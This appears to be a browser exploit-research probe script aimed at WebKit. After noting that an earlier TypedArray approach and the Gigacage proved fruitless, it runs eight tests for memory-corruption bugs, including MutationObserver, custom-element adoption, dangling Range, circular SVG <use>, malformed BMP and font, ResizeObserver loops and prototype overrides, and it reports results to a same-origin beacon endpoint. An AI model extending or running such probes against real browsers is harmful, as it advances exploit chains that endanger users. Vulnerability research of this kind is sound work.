/* p81-dom — WebKit DOM/rendering attack surfaces
 *
 * RAB/TypedArray path is exhausted. Gigacage is airtight.
 * Pivot to DOM/CSS/SVG attack surfaces:
 *
 * 1. MutationObserver + innerHTML — UAF during DOM construction
 * 2. Custom Elements + adoptedCallback — lifecycle callback during adoption
 * 3. CSS animation + reflow — callback during layout
 * 4. SVG <use> cloning — circular reference UAF
 * 5. Range/Selection manipulation during mutation
 * 6. createImageBitmap with crafted malformed images
 * 7. CSS @font-face with crafted data: URL
 * 8. importmap + dynamic module graph manipulation
 *
 * Beacon prefix: V81D-
 */
(function(){
"use strict";
var RUN_ID = "v81d" + Math.random().toString(36).slice(2,12);
var PREFIX = "V81D-";

function B(tag, body) {
  try {
    var d = typeof body === "object" ? JSON.stringify(body) : String(body);
    fetch("/beacon/" + PREFIX + tag, {
      method: "POST", body: JSON.stringify({r: RUN_ID, b: d.slice(0,1800)}),
      headers: {"Content-Type":"application/json"}
    }).catch(function(){});
  } catch(e){}
}
B("L", "press81-DOM attack surfaces");

/* ====== D1: MutationObserver + innerHTML manipulation ====== */
function test_D1() {
  var r = {};
  try {
    var container = document.createElement('div');
    document.body.appendChild(container);

    var mutCount = 0;
    var mutInMut = false;
    var error = null;

    var obs = new MutationObserver(function(mutations) {
      mutCount++;
      if (mutCount === 1) {
        // During the first mutation (innerHTML parse), modify the container
        try {
          // Remove a child that's being added
          if (container.firstChild) {
            container.removeChild(container.firstChild);
            mutInMut = true;
          }
          // Add a new element during mutation
          var div = document.createElement('div');
          div.id = 'injected-' + mutCount;
          container.appendChild(div);
        } catch(e) {
          error = e.message.slice(0,40);
        }
      }
    });

    obs.observe(container, { childList: true, subtree: true });

    // Set innerHTML — this triggers DOM construction + MutationObserver
    container.innerHTML = '<div id="a"><span id="b">text</span></div><div id="c"></div>';

    // Force synchronous layout
    var h = container.offsetHeight;

    setTimeout(function() {
      r.mutCount = mutCount;
      r.mutInMut = mutInMut;
      r.error = error;
      r.childCount = container.children.length;
      r.firstChildId = container.firstChild ? container.firstChild.id : null;
      obs.disconnect();
      document.body.removeChild(container);
      B("D1-MUTOBS", r);
    }, 100);

  } catch(e) { r.err = e.message.slice(0,80); B("D1-MUTOBS", r); }
}

/* ====== D2: Custom Element lifecycle callbacks during adoption ====== */
function test_D2() {
  var r = {};
  try {
    var callbackLog = [];
    var adopted = false;

    class TestElement extends HTMLElement {
      connectedCallback() {
        callbackLog.push("connected:" + this.ownerDocument.title);
      }
      disconnectedCallback() {
        callbackLog.push("disconnected");
      }
      adoptedCallback(oldDoc, newDoc) {
        callbackLog.push("adopted");
        adopted = true;
        // During adoption, try to manipulate the element
        try {
          this.innerHTML = '<span>injected during adopt</span>';
          callbackLog.push("inject-ok");
        } catch(e) {
          callbackLog.push("inject-err:" + e.message.slice(0,20));
        }
      }
      attributeChangedCallback(name, oldVal, newVal) {
        callbackLog.push("attr:" + name + "=" + newVal);
        // During attribute change, try to remove self
        if (name === 'data-trigger' && this.parentNode) {
          try {
            this.parentNode.removeChild(this);
            callbackLog.push("self-remove-ok");
          } catch(e) {
            callbackLog.push("self-remove-err");
          }
        }
      }
      static get observedAttributes() { return ['data-trigger', 'class']; }
    }

    customElements.define('test-elem-' + RUN_ID.slice(0,6), TestElement);
    var tagName = 'test-elem-' + RUN_ID.slice(0,6);

    var el = document.createElement(tagName);
    document.body.appendChild(el);

    // Trigger adoptedCallback by moving to a new document
    var iframe = document.createElement('iframe');
    document.body.appendChild(iframe);
    var newDoc = iframe.contentDocument;

    try {
      newDoc.body.appendChild(el); // triggers disconnectedCallback + adoptedCallback + connectedCallback
    } catch(e) {
      callbackLog.push("adopt-err:" + e.message.slice(0,30));
    }

    // Trigger attribute change + self-removal
    el.setAttribute('data-trigger', 'fire');

    setTimeout(function() {
      r.callbackLog = callbackLog.join("|");
      r.adopted = adopted;
      r.elInDoc = el.ownerDocument === newDoc;
      document.body.removeChild(iframe);
      B("D2-CUSTOM-ELEM", r);
    }, 100);

  } catch(e) { r.err = e.message.slice(0,80); B("D2-CUSTOM-ELEM", r); }
}

/* ====== D3: Range manipulation during DOM mutation ====== */
function test_D3() {
  var r = {};
  try {
    var container = document.createElement('div');
    container.innerHTML = '<p id="p1">Hello <b id="b1">world</b></p><p id="p2">foo</p>';
    document.body.appendChild(container);

    // Create a Range spanning across elements
    var range = document.createRange();
    range.setStart(container.querySelector('#p1').firstChild, 2); // "llo"
    range.setEnd(container.querySelector('#p2').firstChild, 2); // "fo"

    r.rangeOK = true;
    r.rangeStr = range.toString();

    // Now remove an element that the range spans
    container.removeChild(container.querySelector('#p1'));

    try {
      r.afterRemove = range.toString();
      r.rangeCollapsed = range.collapsed;
      r.RANGE_DANGLING = !range.collapsed && r.afterRemove.length > 0;
    } catch(e) {
      r.rangeErr = e.name + ":" + e.message.slice(0,40);
    }

    // Try to extract contents from potentially dangling range
    try {
      var frag = range.extractContents();
      r.extractedNodes = frag.childNodes.length;
    } catch(e) {
      r.extractErr = e.name + ":" + e.message.slice(0,40);
    }

    document.body.removeChild(container);
  } catch(e) { r.err = e.message.slice(0,80); }
  B("D3-RANGE", r);
}

/* ====== D4: SVG use + circular reference ====== */
function test_D4() {
  var r = {};
  try {
    var svg = document.createElementNS('http://www.w3.org/2000/svg', 'svg');
    svg.setAttribute('width', '100');
    svg.setAttribute('height', '100');

    // Create circular <use> references
    var defs = document.createElementNS('http://www.w3.org/2000/svg', 'defs');
    var g1 = document.createElementNS('http://www.w3.org/2000/svg', 'g');
    g1.setAttribute('id', 'g1');
    var use1 = document.createElementNS('http://www.w3.org/2000/svg', 'use');
    use1.setAttributeNS('http://www.w3.org/1999/xlink', 'href', '#g2');
    g1.appendChild(use1);

    var g2 = document.createElementNS('http://www.w3.org/2000/svg', 'g');
    g2.setAttribute('id', 'g2');
    var use2 = document.createElementNS('http://www.w3.org/2000/svg', 'use');
    use2.setAttributeNS('http://www.w3.org/1999/xlink', 'href', '#g1');
    g2.appendChild(use2);

    defs.appendChild(g1);
    defs.appendChild(g2);
    svg.appendChild(defs);

    // Use both
    var use3 = document.createElementNS('http://www.w3.org/2000/svg', 'use');
    use3.setAttributeNS('http://www.w3.org/1999/xlink', 'href', '#g1');
    svg.appendChild(use3);

    document.body.appendChild(svg);

    // Force render
    var bbox = svg.getBBox();
    r.bboxW = bbox.width;
    r.bboxH = bbox.height;
    r.SVG_OK = true;

    // Dynamically modify the use target
    g1.innerHTML = '';
    var rect = document.createElementNS('http://www.w3.org/2000/svg', 'rect');
    rect.setAttribute('width', '50');
    rect.setAttribute('height', '50');
    rect.setAttribute('fill', 'red');
    g1.appendChild(rect);

    // Force re-render of use clones
    var bbox2 = svg.getBBox();
    r.bbox2W = bbox2.width;
    r.RERENDER = bbox2.width > 0;

    document.body.removeChild(svg);
  } catch(e) { r.err = e.message.slice(0,80); }
  B("D4-SVG-USE", r);
}

/* ====== D5: createImageBitmap with malformed images ====== */
function test_D5() {
  var r = {};
  try {
    var results = [];

    // Malformed BMP: negative dimensions
    function tryBMP(desc, width, height) {
      var buf = new ArrayBuffer(54 + 4);
      var dv = new DataView(buf);
      dv.setUint8(0, 0x42); dv.setUint8(1, 0x4D);
      dv.setUint32(2, 58, true);
      dv.setUint32(10, 54, true);
      dv.setUint32(14, 40, true);
      dv.setInt32(18, width, true);  // signed!
      dv.setInt32(22, height, true); // signed!
      dv.setUint16(26, 1, true);
      dv.setUint16(28, 24, true);

      var blob = new Blob([buf], { type: 'image/bmp' });
      return createImageBitmap(blob).then(function(bmp) {
        results.push(desc + ":OK:" + bmp.width + "x" + bmp.height);
      }).catch(function(e) {
        results.push(desc + ":ERR:" + e.message.slice(0,30));
      });
    }

    Promise.all([
      tryBMP("neg-w", -100, 100),
      tryBMP("neg-h", 100, -100),
      tryBMP("neg-both", -100, -100),
      tryBMP("zero", 0, 0),
      tryBMP("huge", 100000, 100000),
      tryBMP("int-overflow", 0x7FFFFFFF, 2),
    ]).then(function() {
      r.results = results.join("|");
      B("D5-MAL-BMP", r);
    });

  } catch(e) { r.err = e.message.slice(0,80); B("D5-MAL-BMP", r); }
}

/* ====== D6: CSS font-face with data: URI ====== */
function test_D6() {
  var r = {};
  try {
    // Craft a minimal WOFF2-like header in a data: URI
    // This tests if the font parser crashes on malformed data
    var fontBytes = new Uint8Array(64);
    // WOFF2 magic: wOF2 = 0x774F4632
    fontBytes[0] = 0x77; fontBytes[1] = 0x4F;
    fontBytes[2] = 0x46; fontBytes[3] = 0x32;
    // Garbage data after header
    for (var i = 4; i < 64; i++) fontBytes[i] = i;

    var b64 = btoa(String.fromCharCode.apply(null, fontBytes));
    var dataUri = 'data:font/woff2;base64,' + b64;

    var style = document.createElement('style');
    style.textContent = '@font-face { font-family: "test-font"; src: url("' + dataUri + '"); }';
    document.head.appendChild(style);

    var span = document.createElement('span');
    span.style.fontFamily = '"test-font", sans-serif';
    span.textContent = 'Test font loading';
    document.body.appendChild(span);

    // Force layout to trigger font load
    var w = span.offsetWidth;
    r.fontApplied = true;
    r.spanWidth = w;

    setTimeout(function() {
      var w2 = span.offsetWidth;
      r.spanWidth2 = w2;
      r.FONT_CHANGED = w !== w2; // font loaded and changed width
      document.head.removeChild(style);
      document.body.removeChild(span);
      B("D6-FONT", r);
    }, 500);

  } catch(e) { r.err = e.message.slice(0,80); B("D6-FONT", r); }
}

/* ====== D7: ResizeObserver + DOM manipulation loop ====== */
function test_D7() {
  var r = {};
  try {
    var container = document.createElement('div');
    container.style.width = '100px';
    container.style.height = '100px';
    document.body.appendChild(container);

    var callCount = 0;
    var looped = false;

    var ro = new ResizeObserver(function(entries) {
      callCount++;
      if (callCount < 50) {
        // Resize inside ResizeObserver → should trigger another callback
        container.style.width = (100 + callCount) + 'px';
        if (callCount > 5) looped = true;
      }
      if (callCount === 10) {
        // During resize observation, manipulate DOM aggressively
        try {
          container.innerHTML = '<div style="width:200px;height:200px"></div>';
        } catch(e) {}
      }
    });

    ro.observe(container);
    container.style.width = '150px'; // trigger initial observation

    setTimeout(function() {
      r.callCount = callCount;
      r.looped = looped;
      r.RESIZE_LOOP = callCount > 10;
      ro.disconnect();
      document.body.removeChild(container);
      B("D7-RESIZE-OBS", r);
    }, 1000);

  } catch(e) { r.err = e.message.slice(0,80); B("D7-RESIZE-OBS", r); }
}

/* ====== D8: Prototype pollution on DOM nodes ====== */
function test_D8() {
  var r = {};
  try {
    // Can we pollute Object.prototype to affect DOM behavior?
    var saved = Object.prototype.toString;

    // Test 1: Override Symbol.toPrimitive on a DOM node
    var div = document.createElement('div');
    try {
      div[Symbol.toPrimitive] = function(hint) {
        if (hint === 'number') return 42;
        return 'polluted';
      };
      r.toPrim = +div; // should be 42
      r.toPrimStr = '' + div; // should be 'polluted'
    } catch(e) {
      r.toPrimErr = e.message.slice(0,40);
    }

    // Test 2: Override Symbol.species on Array
    var origSpecies = Array[Symbol.species];
    try {
      Object.defineProperty(Array, Symbol.species, {
        get: function() {
          r.speciesCalled = true;
          return Array; // return normal but track the call
        }, configurable: true
      });

      var arr = [1,2,3];
      var mapped = arr.map(function(x) { return x * 2; });
      r.mappedOK = mapped.length === 3;
    } catch(e) {
      r.speciesErr = e.message.slice(0,40);
    } finally {
      try {
        Object.defineProperty(Array, Symbol.species, {
          get: function(){ return Array; }, configurable: true
        });
      } catch(e) {}
    }

    // Test 3: Override valueOf on TypedArray prototype
    var origValueOf = Uint8Array.prototype.valueOf;
    try {
      Uint8Array.prototype.valueOf = function() {
        r.valueOfHijacked = true;
        return origValueOf.call(this);
      };
      var ta = new Uint8Array(4);
      var v = +ta; // triggers valueOf
    } catch(e) {
      r.valueOfErr = e.message.slice(0,40);
    } finally {
      Uint8Array.prototype.valueOf = origValueOf;
    }

  } catch(e) { r.err = e.message.slice(0,80); }
  B("D8-PROTO-POLL", r);
}

/* ====== Run ====== */
try {
  test_D1();
  setTimeout(test_D2, 200);
  setTimeout(test_D3, 600);
  setTimeout(test_D4, 1000);
  setTimeout(test_D5, 1400);
  setTimeout(test_D6, 1800);
  setTimeout(test_D7, 2200);
  setTimeout(test_D8, 3500);
} catch(e) { B("FATAL", String(e).slice(0,200)); }

var hbI = setInterval(function(){ B("HB","hb"); }, 2500);
setTimeout(function(){ clearInterval(hbI); B("Z2","probe81-done"); }, 25000);
})();
